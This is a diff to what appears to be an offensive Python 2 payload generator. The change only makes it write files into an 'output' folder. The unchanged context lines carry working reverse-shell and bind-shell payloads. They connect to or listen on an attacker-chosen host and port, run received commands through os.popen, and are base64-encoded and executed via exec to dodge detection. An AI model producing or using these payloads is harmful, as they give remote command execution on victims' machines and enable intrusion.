@@ -179,7 +179,11 @@ def listener():
 def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
 	pth = raw_input('File name (ex: payload.pyw): ')
 	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(1024)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tconn=os.getcwd()\n\t\ts.send(conn)\n\telse:\n\t\tcmd = os.popen(conn).read()\n\t\ts.sendall(cmd+"\\n")'
-	_file = open(pth,'w')
+	if os.path.isdir('output'):
+		pth = 'output/'+pth
+		_file = open(pth, 'w')
+	else:
+		_file = open(pth, 'w')
 	print '%s[*]%s Enconding' %(blue,white)
 	enc = payload.encode('base64').replace('\n','') # encode as base64 
 	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
@@ -194,7 +198,11 @@ def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
 def fud_bindshell(lhost, lport): # bind shell (.py/.pyw)
 	pth = raw_input('File name (ex: payload.pyw): ')
 	payload = 'from socket import socket, AF_INET, SOCK_STREAM\\nimport os\\nhost="'+lhost+'"\\nport=int("'+lport+'")\\ns=socket(AF_INET, SOCK_STREAM)\\ns.bind(('',port))\\ns.listen(1)\\nwhile 1:\\n\\ttry:\\n\\t\\tc, addr = s.accept()\\n\\t\\tprint "[+] Connection from", addr\\n\\t\\twhile 1:\\n\\t\\t\\tconn = c.recv(1024)\\n\\t\\t\\tif conn[:2] == "cd":\\n\\t\\t\\t\\tos.chdir(str(conn[3:]))\\n\\t\\t\\t\\tconn = os.getcwd()\\n\\t\\t\\t\\tc.sendall(conn)\\n\\t\\t\\telse:\\n\\t\\t\\t\\tcmd = os.popen(conn).read()\\n\\t\\t\\t\\tc.sendall(cmd+"\n")\\n\\texcept KeyboardInterrupt:\\n\\t\\tbreak'
-	_file = open(pth, 'w')
+	if os.path.isdir('output'):
+		pth = 'output/'+pth
+		_file = open(pth, 'w')
+	else:
+		_file = open(pth, 'w')
 	print '%s[*]%s Enconding' %(blue,white)
 	enc = payload.encode('base64')
 	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
